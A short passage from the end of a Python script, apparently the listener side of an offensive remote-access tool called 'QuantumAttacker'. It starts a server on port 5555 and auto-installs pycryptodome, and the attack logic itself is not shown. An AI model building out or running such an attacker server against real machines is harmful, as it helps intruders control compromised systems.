                pass

        print(f"\n{Colors.BOLD}{Colors.RED}[!] Quantum Attacker shutdown complete{Colors.END}")


def main():
    """Main function"""
    try:
        HOST = '0.0.0.0'
        PORT = 5555

        if len(sys.argv) >= 2:
            HOST = sys.argv[1]
        if len(sys.argv) >= 3:
            PORT = int(sys.argv[2])

        attacker = QuantumAttacker(host=HOST, port=PORT)
        attacker.start_server()

    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Shutdown by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Fatal error: {e}{Colors.END}")
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    try:
        import Cryptodome
    except ImportError:
        print(f"{Colors.YELLOW}[!] Installing required packages...{Colors.END}")
        import subprocess

        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])

    main()